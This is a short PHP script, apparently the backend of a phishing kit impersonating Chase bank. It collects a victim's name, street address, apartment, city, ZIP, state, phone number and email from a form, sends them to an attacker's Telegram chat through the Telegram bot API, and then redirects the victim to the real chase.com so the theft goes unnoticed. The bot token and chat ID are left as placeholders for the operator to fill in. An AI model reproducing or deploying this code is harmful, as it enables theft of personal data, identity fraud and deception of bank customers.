<?php
$telegram_bot_token = 'TELEGRAM BOT TOKEN HERE';
$telegram_chat_id = 'CHAT ID HERE (ADD THE BOT TO THE GROUP FIRST)';

$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
$street = $_POST['street'];
$apartment = $_POST['apartment'];
$city = $_POST['city'];
$zip = $_POST['zip'];
$state = $_POST['state'];
$phone_number = $_POST['phone_number'];
$email = $_POST['email'];

$message = "$first_name|$last_name|$street|$apartment|$city|$zip|$state|$phone_number|$email";
file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message));

header('Location: https://chase.com'); 
exit();
?>
